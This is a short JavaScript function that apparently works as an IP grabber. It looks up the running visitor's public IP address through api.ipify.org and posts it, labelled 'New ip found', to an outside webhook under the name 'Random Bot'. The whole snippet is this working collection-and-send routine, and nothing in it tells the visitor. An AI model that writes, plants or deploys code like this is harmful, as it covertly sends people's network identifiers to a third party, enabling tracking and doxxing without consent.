function sendMessage(webhook) {
    fetch("https://api.ipify.org")
        .then((res) => res.text())
        .then(ip => {
            const request = new XMLHttpRequest();
            request.open("POST", webhook);

            request.setRequestHeader('Content-type', 'application/json');

            const params = {
                username: "Random Bot",
                avatar_url: "",
                content: "New ip found: " + String(ip)
            }

            request.send(JSON.stringify(params));
        })
}